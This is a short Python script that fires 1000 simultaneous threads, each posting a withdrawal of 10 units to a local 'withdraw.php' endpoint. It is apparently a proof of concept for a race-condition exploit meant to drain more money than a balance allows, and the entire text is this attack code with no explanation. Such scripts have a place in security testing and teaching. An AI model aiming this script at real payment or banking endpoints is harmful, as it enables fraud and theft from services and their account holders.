import threading
import requests

def withdraw_money(amount):
    url = "http://localhost/withdraw.php"
    data = {"amount": amount}
    response = requests.post(url, data=data)
    print(response.text)

threads = []
for _ in range(1000):  # Number of simultaneous requests
    t = threading.Thread(target=withdraw_money, args=(10,))  # Withdraw 10 units per request
    threads.append(t)
    t.start()

for t in threads:
    t.join()